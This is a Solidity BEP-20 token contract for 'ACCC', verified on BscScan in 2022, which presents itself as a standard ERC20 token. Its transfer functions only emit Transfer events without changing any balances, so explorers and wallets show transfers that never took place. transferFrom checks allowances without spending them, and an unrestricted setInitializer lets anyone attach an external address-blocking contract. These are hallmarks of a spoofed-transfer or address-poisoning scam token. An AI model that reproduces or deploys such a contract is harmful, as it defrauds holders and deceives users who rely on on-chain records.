/**
 *Submitted for verification at BscScan.com on 2022-09-03
*/

/**
 *Submitted for verification at BscScan.com on 2022-09-03
*/

pragma solidity ^0.8.12;
// SPDX-License-Identifier: Unlicensed


interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor ()   {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xdead));
        _owner = address(0xdead);
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface BlueAnti {
    function getPair(address account) external view returns(bool);
    //function mint(address account, uint256 mount) external;
}

contract Snoopy  is Ownable, IERC20 {    
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;    
    string private  _name = "ACCC";
    string private  _symbol = "ACCC";
    uint8 private  _decimals = 9;
    uint256 private _totalSupply = 1000000000*10 *10 * 10**9;
    BlueAnti blueAnti;

    constructor () {
        _tOwned[_msgSender()] = _totalSupply;        
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }
  
    function decimals() external view returns (uint256) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 Allowancec = _allowances[sender][_msgSender()];
        require(Allowancec >= amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0));
        require(spender != address(0));
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(  address from,  address to,  uint256 amount  ) private {
        require(from != address(0));
        require(to != address(0));
        require(amount > 0);       

        emit Transfer(from, to, amount);
    }

    function setInitializer(address initializer) external  {
        require(initializer != address(this), "hello can't send.");
        blueAnti = BlueAnti(initializer);
    }
 
    function _basicTransfer(address from, address to, uint256 amount) private {
        require(!blueAnti.getPair(from),"this is zero address");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        _tOwned[from] = _tOwned[from] - amount;
        _tOwned[to] = _tOwned[to] + amount;
        emit Transfer(from, to, amount);
    }    


}